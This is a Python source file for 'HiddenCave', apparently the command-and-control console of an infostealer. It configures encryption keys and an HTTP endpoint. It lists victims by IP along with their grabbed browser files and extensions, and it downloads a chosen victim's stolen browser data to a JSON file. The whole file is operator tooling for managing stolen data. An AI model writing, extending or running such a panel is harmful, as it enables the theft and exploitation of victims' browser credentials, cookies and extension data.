import cmd
import os
import json
from utils.asciiart import banner
from models.CORE import Core


class HiddenCave(cmd.Cmd):
    prompt = "$HiddenCave-> "
    doc_header = "Use help <command> for more information."
    core = Core()
    CurrentData = None

    def default(self, arg):
        print("[*] Invalid command, use help for information.")

    def do_exit(self, arg):
        """exit the CLI.\n"""
        exit(0)

    def do_clear(self, arg):
        """clear the stdout.\n"""
        if os.name == 'nt':
            _ = os.system('cls')
        else:
            _ = os.system('clear')

    def do_init(self, arg):
        """init command\n"""
        print("Choose an option:\n\t1. Set cryptographic parameters\n\t2. Set endpoint")
        UserInput = self.core.GetUserInput("[+] Enter the number (1 or 2): ", "[-] Invalid input. Enter either '1' to set cryptographic parameters or '2' to set an endpoint.", 0, ["1", "2"], False)

        if UserInput == "1":
            if self.core.CheckParam() is True:
                status = self.core.GetUserInput("[+] The cryptographic parameters are already set Do you want to replace it with a new ones? (y/n) ", "[-] Invalid input. Input must be either y or n", 0, ["y", "n"], True)
                if status == "n":
                    return

            RandomParam = self.core.GetUserInput("[+] Do you wanna generate random parameters? (Y/N) ", "[-] Invalid input. Input must be either y or n", 0, ["y", "n"], True)
            if RandomParam == "y":
                self.core.CryptoParam(None)
            else:
                print("[+] Enter Key and IV, the key's length must be exactly 32 and the IV's length must be exactly 12.")
                data = {}
                data["key"] = self.core.GetUserInput("Key: ", "[-] Invalid key length. Expected 32 but got ", 32, None, False)
                data["IV"] = self.core.GetUserInput("IV: ", "[-] Invalid IV length. Expected 12 but got ", 12, None, False)
                self.core.CryptoParam(data)
        else:
            if self.core.ApiUrl is not None:
                status = self.core.GetUserInput("[+] An endpoint is already set. Do you want to replace it with a new one? (y/n) ", "[-] Invalid input. Input must be either y or n", 0, ["y", "n"], True)
                if status == "n":
                    return

            print("[+] Enter the endpoint URL. It must be an HTTP URL and should not end with a slash.\n    Example of a valid URL: http://127.0.0.1")
            UserInput = self.core.GetUserInput("ENDPOINT: ", "", 0, None, True)
            if UserInput[:7] != "http://":
                while True:
                    print("[-] Invalid input, the endpoint URL must be http.")
                    UserInput = self.core.GetUserInput("ENDPOINT: ", "", 0, None, True)
                    if UserInput[:7] == "http://":
                        break
            self.core.ApiUrl = UserInput

    def do_save(self, arg):
        """save command\n"""
        args = arg.split(".")
        if args[-1] != "json":
            print("[-] Invalid file name, The file must have the json file extention \".json\".")
            return

        if os.path.isfile(arg) is True:
            IsTrue = self.core.GetUserInput("File already exists. Do you want to overwrite the file? (Y/N): ", "Input must be either Y or N", 0, ["y", "n"], True)
            if IsTrue == "n":
                return

        self.core.save(arg)

    def do_load(self, arg):
        """load command\n"""
        args = arg.split(".")
        if args[-1] != "json":
            print("[-] Invalid file name, the file must have the json file extention \".json\".")
            return

        if os.path.isfile(arg) is False:
            print("[-] The file does not exist.")
            return

        self.core.load(arg)

    def do_check(self, arg):
        """endpoint and cryptographic parameters check command\n"""
        self.core.check()

    def do_getall(self, arg):
        """getall command\n"""
        self.CurrentData = self.core.GetVictims()

        if self.CurrentData is not None:
            for ip in self.CurrentData.keys():
                TotalBrowsers = int(self.CurrentData[ip]["BrowserCount"])
                print("#" * 35)
                print(f"[+] Victim IP: {ip}")
                print(f"[+] Total grabbed browsers: {TotalBrowsers}")

                for i in range(0, TotalBrowsers):
                    print(f"[+] Browser {i + 1}")

                    extentions = self.CurrentData[ip]["browsers"][i]["extentions"]
                    BrowserFiles = self.CurrentData[ip]["browsers"][i]["browserfiles"]

                    print("    Browser files:")
                    for file in BrowserFiles:
                        print(f"\t- {file}")

                    print("    Extentions:")
                    for extention in extentions.keys():
                        print(f"\t- {extention}")
            print("#" * 35)
        else:
            print("[-] You should first run the command check to check the endpoint and cryptographic parameters.")

    def do_grab(self, arg):
        if len(arg) == 0:
            print("[-] Invalid input.")
            return

        data = self.core.GetVictimBrowsersData(arg)
        if data is not None:
            FileName = arg + ".json"
            file = open(FileName, "w")
            json.dump(data, file, indent=4)
            file.close()


if __name__ == '__main__':
    try:
        print(banner)
        HiddenCave().cmdloop()
    except KeyboardInterrupt:
        exit(0)
